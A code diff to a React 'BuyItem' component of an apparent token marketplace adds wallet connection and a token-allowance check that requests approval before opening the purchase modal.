@@ -7,13 +7,31 @@ import {
 } from '@chakra-ui/react';
 import Socialbutton from '../../components/SocialButton';
 import BuyModal from '../../components/BuyModal';
+import { useWallet } from 'use-wallet';
+import BigNumber from 'bignumber.js';
+import { ethers } from "ethers";
+import { approveToken, checkAllowance } from '../../contracts/starlink';
 
 const BuyItem = () => {
 
+    const wallet = useWallet();
     const [isOpen, setIsOpen] = useState(false);
 
-    const openModal = () => {
-        setIsOpen(true);
+    const openModal = async() => {
+        const owner_addr = "0x5a168798df2b9d84e28958702156b036927a9e29";
+        const walletAddres = wallet.account;
+
+        const provider = new ethers.providers.Web3Provider(wallet.ethereum);
+        const signer = await provider.getSigner();
+
+        const needApprove = await checkAllowance(owner_addr, walletAddres, signer);
+        const amount = new BigNumber(needApprove);
+        if (amount.eq("0")) {
+            const approveRes = await approveToken(walletAddres, 0, signer);
+            if (approveRes) setIsOpen(true);
+        } else {
+            setIsOpen(true);
+        }
     };
 
     const cloesModal = () => {
